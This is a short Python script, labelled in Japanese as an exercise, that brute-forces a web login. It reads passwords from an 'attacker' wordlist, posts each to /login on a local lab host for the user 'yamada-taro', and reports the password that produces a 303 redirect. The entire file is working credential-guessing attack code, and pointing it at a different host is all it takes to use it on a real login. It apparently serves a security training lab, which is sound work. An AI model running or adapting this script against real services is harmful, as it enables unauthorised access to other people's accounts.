# 演習用: ログインを総当たりする
import httpx

BASE = "http://app:8000"
words = open("attacker/wordlist.txt").read().split()

for i, word in enumerate(words, 1):
    client = httpx.Client(base_url=BASE, follow_redirects=False, timeout=30)
    client.get("/login")
    r = client.post("/login", data={"username": "yamada-taro", "password": word})
    print(i, word, r.status_code)
    if r.status_code == 303:
        print("当たり:", word)
        break
